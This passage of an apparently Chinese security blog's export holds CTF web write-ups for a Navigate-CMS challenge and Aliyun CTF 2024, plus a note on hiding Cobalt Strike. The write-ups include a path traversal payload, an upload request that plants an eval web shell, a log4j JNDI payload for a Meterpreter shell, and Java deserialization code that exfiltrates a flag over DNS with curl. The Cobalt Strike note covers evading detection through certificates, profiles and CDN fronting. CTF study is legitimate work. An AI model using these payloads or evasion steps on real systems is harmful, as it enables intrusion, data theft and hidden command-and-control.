<p>getheaders获取headers信息，end是获取最后一个，system直接系统命令，我们只需把需要执行的命令放入header的最后一个字段就行了。system(end(getheaders())) </p>
<p><img data-src="/images/pages/image-20220705155003413.png" alt="image-20220705155003413"></p>
<h2 id="高手高手高高手"><a href="#高手高手高高手" class="headerlink" title="高手高手高高手"></a>高手高手高高手</h2><p>由于没有环境了可能只是说一下思路和当时遇到的问题。</p>
<p>首先这道题目是Navigate-CMS 目录有git泄漏：</p>
<p><img data-src="/images/pages/image-20220705160301716.png" alt="image-20220705160301716"></p>
<p>但是这里的git泄漏我并没有拿到源码，不知道是不是有什么奇怪知识点。所以就去github上找了对应的<a href="https://github.com/NavigateCMS/Navigate-CMS">Navigatecms</a> 源码</p>
<p>通过搜索最近的漏洞详情，发现2022年刚爆出一个任意文件读取的漏洞提醒，根据代码审计了对应代码发现在navigate_download.php存在id参数的任意文件读取：</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>但是没什么用 flag不在根目录。</p>
<p>然后搜索到另一个任意文件覆盖上传：</p>
<p><a href="https://www.exploit-db.com/exploits/45561">https://www.exploit-db.com/exploits/45561</a></p>
<p>但是因为github的代码是最新的所以已经修复过了，只能通过上面的任意文件读取拿到navigate_upload.php源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../var/www/html/navigate_upload.php</span><br></pre></td></tr></table></figure>

<p>拿到源码发现漏洞存在于139行</p>
<p><img data-src="/images/pages/image-20220705161744409.png" alt="image-20220705161744409"></p>
<p>engine&#x3D;picnik时可以进行文件覆盖，但是这里过滤了..&#x2F; 仍然很好绕过 通过…&#x2F;.&#x2F;得到..&#x2F;，所以我们直接覆盖navigate_info.php这个文件的内容：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/navigate_upload.php?session_id=vcu80v6qbgcjrajhka5acjh887&amp;engine=picnik&amp;id=../../../navigate_info.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.116</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>519</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysFc8yFB2XMDgA35C</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.116</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.116/navigate.php?fid=websites&amp;act=2&amp;id=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>NVSID_7da51544=vcu80v6qbgcjrajhka5acjh887; PHPSESSID=vcu80v6qbgcjrajhka5acjh887; navigate-tinymce-scroll=%7B%7D; navigate-user=efc2e3b89151d3e84e01f5fc10d841703bf119dd; navigate-language=en; navigate-tree-structure-1=%5B%22node-0%22%2C%22node-2%22%5D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">12222345</span>.php</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunk&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">0</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunks&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">1</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;122245.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">phpinfo</span>();</span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmdd5556&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C--</span></span><br></pre></td></tr></table></figure>

<p>拿到shell我们发现根目录存在I_want_capture_the_flag二进制文件,但是运行说什么皇家赌场还没下线，不给flag，二进制逆向发现回去判断两个文件存不存在，如果不存在再通过一系列运算给出flag:</p>
<p><img data-src="/images/pages/image-20220705162041847.png" alt="image-20220705162041847"></p>
<p>现在我们知道需要删除&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.* ,但是我们并没有权限，这里我们就需要提权。首先我们根据网站目录下的隐藏php文件-&gt;</p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;.my_date.php  的提示拿到账号密码 并可以ssh登陆 。登陆后发现账户下面存在.get_root目录里面有现成的提权脚本，先利用源码中的配置文件泄漏的用户navigate 运行mysql-privesc-race拿到mysql权限（时间很长，要等很久要有耐心），再利用得到的mysql账户权限运行mysql-chowned.sh，拿到root。（这两个提权网上可以搜索到，这里不再赘述，第一步提权有条件竞争需要等待较长时间）</p>
<p>拿到root后我们去删除&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.*  依然不行，后来发现文件存在a属性，通过修改属性即可删除：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsattr bocai.png</span><br><span class="line">chattr -a bocai.png</span><br><span class="line">lsattr bocai.html</span><br><span class="line">chattr -a bocai.html</span><br></pre></td></tr></table></figure>

<p>最后我们删除bocai.*  再次运行&#x2F;var&#x2F;www&#x2F;html&#x2F;I_want_capture_the_flag拿到flag</p>
<p><strong>拓展</strong></p>
<p>Linux chattr命令用于改变文件属性。</p>
<p>这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式：</p>
<p>a：让文件或目录仅供附加用途。<br>b：不更新文件或目录的最后存取时间。<br>c：将文件或目录压缩后存放。<br>d：将文件或目录排除在倾倒操作之外。<br>i：不得任意更动文件或目录。<br>s：保密性删除文件或目录。<br>S：即时更新文件或目录。<br>u：预防意外删除。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>cobaltstrike隐藏特征</title>
    <url>//posts/cobaltstrike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/</url>
    <content><![CDATA[<h1 id="cobaltstrike隐藏特征记录"><a href="#cobaltstrike隐藏特征记录" class="headerlink" title="cobaltstrike隐藏特征记录"></a>cobaltstrike隐藏特征记录</h1><h2 id="端口特征"><a href="#端口特征" class="headerlink" title="端口特征"></a>端口特征</h2><p>端口尽量修改非默认端口，除了是规避特征，也防止被扫。这个修改端口非常简单，这里不再赘述。</p>
<h2 id="证书特征"><a href="#证书特征" class="headerlink" title="证书特征"></a>证书特征</h2><p>这里cobalstrike有两个地方需要用到证书，一个是和CS的通信，另一个则是我们创建https监听器时也需要证书，这两个都有默认自带，但是肯定是有特征的，所以都需要自己生成。一般网上教程会忽略对https证书的修改，可能也会被杀软标记。</p>
<h4 id="ulike-store"><a href="#ulike-store" class="headerlink" title="ulike.store"></a>ulike.store</h4><p>我们这里直接使用linux自带的keytool命令生成证书</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keytool -keystore ulike.store -storepass xxxx123 -keypass xxxx123 -genkey -keyalg RSA -<span class="built_in">alias</span> ulike.com -dname <span class="string">&quot;CN=US, OU=ulike.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里面的密码我们要记住，后面定制profile还需要使用。</p>
<p>你可以生成两个不同的证书，也可以都适用这一个证书。当然网上还有教程推荐生成带绿标的https证书，我觉得没有那个必要，能用就行，如果你需要一个真正合规的https证书，那你需要申请一个域名，然后去cloudfare或者freessl网站上去申请一个证书，也是免费的。</p>
<h2 id="流量和行为特征"><a href="#流量和行为特征" class="headerlink" title="流量和行为特征"></a>流量和行为特征</h2><p>流量特征如果你有深厚的编程功底，可以直接去二开CS，很多安全大厂也是这样做的。当然我没有😂，所以我选择定制一下profile, cs的profile文件可以修改流量特征以及修改beacon的默认行为，目的是为了让通信变得更加隐蔽。</p>
<p>如果你对profile的语法还不够了解，甚至不知道是什么，推荐去读一下官方文档或者这个：<a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p>
<p>我们这里不直接提供profile 样例，而是说一下应该注意什么：</p>
<ul>
<li><p>首先是要修改https http 的各种流量特征，加一些自己的定制字段和header伪造为正常的流量。</p>
</li>
<li><p>修改pipename管道名称</p>
</li>
<li><p>绑定https证书</p>
</li>
</ul>
<p>我们绑定上面的证书在profile中可以这样写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;ulike.store&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;xxxx123&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>至于其他的一些细节，比如<strong>进程注入、反射的beacon.dll文件的具体特征等</strong>，可以去github上查找红队大佬的profile案例，理解后学习。每个人的写法不一致，而且被研究后也容易被针对。</p>
<h2 id="vps特征"><a href="#vps特征" class="headerlink" title="vps特征"></a>vps特征</h2><p>有时候我们的流量免杀可能都做到位了，但是还是被杀，可以考虑下是不是vps被标记了。更换vps。或者在一开始使用的时候，就可以使用cdn，域前置技术，来规避vps的ip被直接标记。</p>
]]></content>
      <categories>
        <category>红蓝对抗</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>2024aliyunctf-web-writeup</title>
    <url>//posts/2024aliyunctf-web-writeup/</url>
    <content><![CDATA[<h1 id="2024Aliyun-ctf-web-writeup"><a href="#2024Aliyun-ctf-web-writeup" class="headerlink" title="2024Aliyun-ctf-web writeup"></a>2024Aliyun-ctf-web writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是周末比赛，希望以后的CTF组织者都搞到周中 这样在公司上班就能打比赛，本来也是公司要求参与的。这次web题目难度还行，其他的题目没怎么做。所以还是只写web的题目了，记录下。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><img data-src="/images/pages/image-20240326101813236.png" alt="image-20240326101813236" style="zoom:50%;" />

<p>一看就是查询dns的，抓包：</p>
<img data-src="/images/pages/image-20240326101851988.png" alt="image-20240326101851988" style="zoom:50%;" />

<p>很有可能是dig命令，最终将结果base64返回并输出，探测了很长时间domain发现过滤的非常严格。后续在type处注入，也大量的字符转义。翻阅dig参数 有一个-f读取文件，直接读根目录flag。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span><span class="string">&quot;baidu.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;-f/flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="easyCAS"><a href="#easyCAS" class="headerlink" title="easyCAS"></a>easyCAS</h3><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>username处存在log4j，使用burp自带的dnslog探测确实存在。使用JNDIExploit 直接利用tomcatbypass模块反弹shell到metepreter：</p>
<p>先开启ldap</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar --ip 39.105.56.145 --ldapPort 8881</span><br></pre></td></tr></table></figure>

<p>再发送请求</p>
<p>username&#x3D;${jndi:ldap:&#x2F;&#x2F;1.1.1.1:8881&#x2F;TomcatBypass&#x2F;Meterpreter&#x2F;1.1.1.1&#x2F;8884}</p>
<img data-src="/images/pages/image-20240326151324753.png" alt="image-20240326151324753" style="zoom:50%;" />



<h2 id="标准解法"><a href="#标准解法" class="headerlink" title="标准解法"></a>标准解法</h2><p><strong>我猜测这个可能是官方想要的考点，否则log4j打太无脑了。</strong></p>
<p>查阅资料发现默认的用户名是 casuser，密码是 Mellon</p>
<p><a href="http://web3.aliyunctf.com:23723//login?service=http://web3.aliyunctf.com:23723/status/heapdump">http://web3.aliyunctf.com:23723//login?service=http%3A%2F%2Fweb3.aliyunctf.com%3A23723%2Fstatus%2Fheapdump</a></p>
<p>通过上述链接下载heapdump。直接去访问直接跳转127.0.0.1了。</p>
<p>我们先分析题目，说的是5.x以后就没有问题了吗？我们都知道4.x有反序列化的问题，类似shiro有默认key，直接打反序列化的gadgets。现在5.x的key不是默认了，但是我们有heapdump，IDEA打开查询对应可以：</p>
<p>org.apereo.cas.util.cipher.WebflowConversationStateCipherExecutor</p>
<p>先写一个危险类执行命令，test.class：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> aliyunCTF_Easy_Cas;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> execCommand(<span class="string">&quot;cat /flag.txt&quot;</span>).trim();</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;curl &quot;</span>+Base64.getEncoder().encodeToString(result.getBytes()).replaceAll(<span class="string">&quot;=+$&quot;</span>, <span class="string">&quot;&quot;</span>) +<span class="string">&quot;.244uevo5icza8bg0mu6m4krtekki87.burpcollaborator.net&quot;</span>;</span><br><span class="line">        execCommand(command);</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;bash -c &#x27;curl `whoami`.jwjb6cgmatrr0s8heby3w1ja61cw0l.burpcollaborator.net&#x27;&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">execCommand</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line"></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            output.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后我们结合CB1NOCC反序列化链，构造一个反序列化并利用上面拿到的key加密（直接看网上的分析文章把加密部分扒了过来组合）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> aliyunCTF_Easy_Cas;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serialize.Serializer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apereo.cas.util.cipher.WebflowConversationStateCipherExecutor;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">attackAeperoCas</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造CB1nocc链接</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(test.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ti</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ti,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ti, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;eval&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,bc);</span><br><span class="line">        pq.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        pq.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(bc,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;ti,ti&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密payload</span></span><br><span class="line">        <span class="type">byte</span>[] skey = <span class="string">&quot;CdsZkifxK9MfH9v0CJ-DJoEvJ3wPMNqUZ8AKoYFLSCwiQ4PGtuh90rN7-QzyaLdALxO3ZtNfgX_de7Pm7kd0Zg&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] ekey = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">56</span>,<span class="number">62</span>,-<span class="number">30</span>,-<span class="number">91</span>,<span class="number">93</span>,<span class="number">25</span>,<span class="number">105</span>,-<span class="number">71</span>,-<span class="number">92</span>,-<span class="number">30</span>,<span class="number">110</span>,<span class="number">45</span>,-<span class="number">27</span>,<span class="number">44</span>,<span class="number">89</span>,-<span class="number">36</span>&#125;;</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">enkey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(ekey, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="type">WebflowConversationStateCipherExecutor</span> <span class="variable">webflowConversationStateCipherExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebflowConversationStateCipherExecutor</span>(<span class="keyword">new</span> <span class="title class_">String</span>(ekey), <span class="keyword">new</span> <span class="title class_">String</span>(skey), <span class="string">&quot;AES&quot;</span>, <span class="number">512</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里用setfield 因为setfield我们编写类可以设置父类的属性</span></span><br><span class="line">        setfield(webflowConversationStateCipherExecutor, <span class="string">&quot;encryptionKey&quot;</span>, enkey);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(webflowConversationStateCipherExecutor.encode(compressString(barr.toByteArray()))));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] compressString(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="comment">// 使用ByteArrayOutputStream来捕获压缩数据</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(data.length);</span><br><span class="line">             <span class="type">GZIPOutputStream</span> <span class="variable">gzipOS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(bos)) &#123;</span><br><span class="line">            <span class="comment">// 写入数据到GZIPOutputStream，它会处理压缩</span></span><br><span class="line">            gzipOS.write(data);</span><br><span class="line">            <span class="comment">// 完成压缩数据的写入</span></span><br><span class="line">            gzipOS.close();</span><br><span class="line">            <span class="comment">// 返回压缩后的字节数组</span></span><br><span class="line">            <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//得遍历父类设置对应属性。因为encryptionKey属于webflowConversationStateCipherExecutor父类的属性。</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setfield</span><span class="params">(Object targetObject, String fieldName, Object newValue)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取目标对象的类对象</span></span><br><span class="line">            Class&lt;?&gt; currentClass = targetObject.getClass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环遍历当前类及其父类，直到找到该字段或到达Object类</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> (currentClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    field = currentClass.getDeclaredField(fieldName);</span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">// 字段找到，退出循环</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                    <span class="comment">// 当前类中没有该字段，继续在父类中查找</span></span><br><span class="line">                    currentClass = currentClass.getSuperclass();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(<span class="string">&quot;Field &quot;</span> + fieldName + <span class="string">&quot; not found in class hierarchy&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置访问权限，允许访问私有字段</span></span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 设置新的字段值</span></span><br><span class="line">            field.set(targetObject, newValue);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接DNS携带getshell</p>
<img data-src="/images/pages/image-20240327222115754.png" alt="image-20240327222115754" style="zoom:50%;" />

<p>这样可能才是这次考点，但是没想到这个环境有log4j直接就RCE了。</p>
<p>重点：CB1NOCC + 加密流程</p>
<h3 id="Pastbin"><a href="#Pastbin" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>直接条件竞争,代码直接chagpt就行😂：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch_url</span>(<span class="params">session, url</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">	        status = response.status</span><br><span class="line">	        data = <span class="keyword">await</span> response.text()</span><br><span class="line">	        <span class="keyword">if</span> <span class="string">&quot;aliyunctf&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">	        	<span class="built_in">print</span>(<span class="string">&quot;------------------------------&quot;</span>+data)</span><br><span class="line">	        <span class="comment">#print(f&quot;&#123;url&#125; =&gt; Status: &#123;status&#125;, Data: &#123;data[:100]&#125;&quot;)  # 打印状态码和部分响应内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    urls = [<span class="string">&#x27;http://web2.aliyunctf.com:20518/about&#x27;</span>, <span class="string">&#x27;http://web2.aliyunctf.com:20518/flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 